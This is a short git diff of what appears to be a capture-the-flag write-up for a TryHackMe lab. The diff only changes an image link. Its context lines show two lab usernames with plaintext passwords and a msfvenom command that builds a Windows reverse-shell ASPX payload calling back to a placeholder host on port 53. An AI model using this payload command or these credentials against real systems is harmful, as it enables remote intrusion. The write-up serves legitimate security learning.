@@ -89,7 +89,9 @@ Bob - !P@$$W0rD!123
 Bill - Juw4nnaM4n420696969!$$$
 ```
 
-![image]([image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/Relevant(THM)/image%20(1).png?raw=true))
+![image]([image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/3f2c4eb2f420cf3dc3c24b324c83a916a4f5110d/Relevant(THM)/image%20(1).png))
+
+
 
 ```jsx
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f aspx -o rev.aspx
